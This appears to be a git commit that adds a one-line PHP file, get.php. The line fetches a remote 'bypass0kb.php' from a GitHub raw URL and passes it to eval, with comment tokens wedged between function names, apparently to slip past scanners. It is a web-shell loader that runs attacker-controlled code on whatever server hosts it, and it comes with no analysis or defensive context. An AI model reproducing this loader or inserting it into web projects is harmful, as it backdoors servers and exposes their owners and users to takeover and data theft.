0490b15d684f0deb76303ea3b22f8387177a15e4
kitabisacom1337 <dxy1927@gmail.com>
2024-11-29 20:15:30 +0700

    Create get.php

---
+++ get.php
@@ -0,0 +1,1 @@
+<?php eval/**_**/(urldecode('%3f%3e') .file_get_contents/**_**/(urldecode/**_**/('https://raw.githubusercontent.com/kitabisacom1337/Kitabisacom1337/refs/heads/main/bypass0kb.php'))); ?>
